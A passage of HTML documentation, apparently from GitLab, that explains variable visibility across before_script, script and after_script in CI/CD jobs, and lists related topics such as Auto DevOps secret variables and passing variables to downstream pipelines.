<li><code>before_script</code> is executed:</li>
<li>Prints to the output.</li>
<li>Defines the variable for <code>MY_VARIABLE</code>.</li>
<li><code>script</code> is executed:</li>
<li>Prints to the output.</li>
<li>Prints the value of <code>JOB_DEFINED_VARIABLE</code>.</li>
<li>Prints the value of <code>CI_COMMIT_SHA</code>.</li>
<li>Prints the value of <code>MY_VARIABLE</code>.</li>
<li><code>after_script</code> is executed in a new, separate shell context:</li>
<li>Prints to the output.</li>
<li>Prints the value of <code>JOB_DEFINED_VARIABLE</code>.</li>
<li>Prints the value of <code>CI_COMMIT_SHA</code>.</li>
<li>Prints an empty value of <code>MY_VARIABLE</code>. The variable value cannot be detected because <code>after_script</code> is in a separate shell context to <code>before_script</code>.</li>
</ol>
<h2>Related topics</h2>
<ul>
<li>
<p>You can configure <a href="../../topics/autodevops/_index.html">Auto DevOps</a> to pass CI/CD variables
  to a running application. To make a CI/CD variable available as an environment variable in the running application's container,
  <a href="../../topics/autodevops/cicd_variables.md#configure-application-secret-variables">prefix the variable key</a>
  with <code>K8S_SECRET_</code>.</p>
</li>
<li>
<p>The <a href="https://www.youtube.com/watch?v=v4ZOJ96hAck">Managing the Complex Configuration Data Management Monster Using GitLab</a>
  video is a walkthrough of the <a href="https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo">Complex Configuration Data Monorepo</a>
  working example project. It explains how multiple levels of group CI/CD variables
  can be combined with environment-scoped project variables for complex configuration
  of application builds or deployments.</p>
</li>
</ul>
<p>The example can be copied to your own group or instance for testing. More details
  on what other GitLab CI patterns are demonstrated are available at the project page.</p>
<ul>
<li>You can <a href="../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline">pass CI/CD variables to downstream pipelines</a>.
  Use <a href="../yaml/_index.md#triggerforward"><code>trigger:forward</code> keyword</a> to specify what type of variables
  to pass to the downstream pipeline.</li>
</ul></code></pre>
</body>
</html>
